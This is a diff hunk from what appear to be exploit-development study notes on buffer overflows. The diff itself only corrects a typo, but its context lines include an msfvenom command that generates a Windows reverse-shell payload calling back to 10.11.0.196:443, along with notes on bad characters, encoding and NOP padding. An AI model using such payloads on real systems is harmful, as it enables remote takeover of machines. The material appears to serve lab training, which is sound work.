@@ -423,7 +423,7 @@ But need to specify the bad chars in the above script! (0, \n, \r)
 $ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.196 LPORT=443 EXITFUNC=thread -f python -a x86 --platform windows -b "\x00\x0a\x0d"
 
 EXITFUNC param ensures that the exploited program does not crash by terminating just the thread.
-The shellcode is encoded. The decoder part will use the ESP which points to our code so we have to provide some stack space for the decoder to sue otherwise it will overwrite our shellcode rendering it useless.
+The shellcode is encoded. The decoder part will use the ESP which points to our code so we have to provide some stack space for the decoder to use otherwise it will overwrite our shellcode rendering it useless.
 
 We can add NOPs at the beginning of our shellcode.
 
